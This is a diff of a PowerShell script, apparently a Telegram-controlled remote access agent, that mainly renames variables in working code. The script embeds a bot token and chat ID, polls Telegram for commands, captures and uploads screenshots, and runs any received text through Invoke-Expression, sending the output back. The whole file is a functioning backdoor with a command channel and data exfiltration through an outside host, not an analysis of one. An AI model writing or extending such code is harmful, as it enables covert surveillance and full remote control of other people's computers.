@@ -3,44 +3,45 @@ $botToken = "8220355086:AAFI1_k4FoKIF18FShBBn0yezO5dDldzs88"
 $chatId = "6494641721"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 
-function Send-TG ($t, $isPath=$false) {
+function Send-TG ($text, $isPath=$false) {
     try {
-        if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$t" "$apiUrl/sendPhoto" }
+        if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$text" "$apiUrl/sendPhoto" }
         else {
-            $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
-            Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b -ErrorAction Stop
+            $body = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $text"; parse_mode="Markdown"}
+            Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $body -ErrorAction Stop
         }
-    } catch { Write-Host "Network Error: Check VPN/Proxy" }
+    } catch { Write-Host "TG Error" }
 }
 
-Send-TG "🚀 *Agent Started!*`nType /help for commands."
+Send-TG "🚀 *Agent Online!* Type /help"
 $lastId = 0
 
 while ($true) {
     try {
-        $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -ErrorAction Stop
-        foreach ($u in $res.result) {
+        $updates = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -ErrorAction Stop
+        foreach ($u in $updates.result) {
             $lastId = $u.update_id
-            $msg = $u.message.text
+            $msgText = $u.message.text
             if ($u.message.from.id -eq $chatId) {
-                switch ($msg) {
-                    "/start" { Send-TG "✅ Ready." }
-                    "/help"  { Send-TG "📜 *Commands:*`n`n🔹 shot - Screenshot`n🔹 kill - Exit`n🔹 cmd - Execute" }
+                switch ($msgText) {
+                    "/start" { Send-TG "✅ System Ready." }
+                    "/help"  { Send-TG "📜 *Commands:*`n🔹shot - screenshot`n🔹kill - stop agent`n🔹_Type PS command to execute_" }
                     "shot" {
+                        Send-TG "📸 Taking screenshot..."
                         Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-                        $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
-                        $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
-                        $g = [Drawing.Graphics]::FromImage($b)
-                        $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
-                        $tmp = "$env:TEMP\s.png"; $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
-                        $g.Dispose(); $b.Dispose()
-                        Send-TG $tmp $true
-                        if(Test-Path $tmp){ rm $tmp }
+                        $screen = [Windows.Forms.Screen]::PrimaryScreen.Bounds
+                        $bitmap = New-Object Drawing.Bitmap($screen.Width, $screen.Height)
+                        $graphics = [Drawing.Graphics]::FromImage($bitmap)
+                        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+                        $tempPath = "$env:TEMP\s.png"; $bitmap.Save($tempPath, [Drawing.Imaging.ImageFormat]::Png)
+                        $graphics.Dispose(); $bitmap.Dispose()
+                        Send-TG $tempPath $true
+                        if(Test-Path $tempPath){ rm $tempPath }
                     }
                     "kill" { Send-TG "💀 Offline."; exit }
                     default {
                         try {
-                            $out = iex $msg 2>&1 | Out-String
+                            $out = Invoke-Expression $msgText 2>&1 | Out-String
                             $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "✅ Done" } else { "🖥 *Result:*`n$out" }
                             Send-TG $resOut
                         } catch { Send-TG "❌ Error: $($_.Exception.Message)" }
